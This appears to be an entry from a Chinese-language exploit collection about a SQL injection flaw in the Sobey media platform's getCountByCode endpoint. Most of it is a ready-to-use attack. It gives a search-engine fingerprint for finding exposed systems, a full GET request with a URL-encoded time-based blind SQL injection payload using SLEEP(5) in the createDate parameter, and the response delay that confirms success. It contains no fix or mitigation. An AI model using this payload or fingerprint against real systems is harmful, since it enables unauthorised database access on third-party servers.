# 索贝融媒体系统getCountByCode存在SQL注入漏洞

索贝融媒体系统 ｜ SQL注入 ｜ —
- **指纹**：`app="SOBEY-融媒体"`
- **请求**：`GET /sobey-mchEditor/count/getCountByCode?status=1&createDate=%27%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29x%29%20AND%20%271%27=%271 HTTP/1.1`
- **响应特征**：200 响应时间>=5s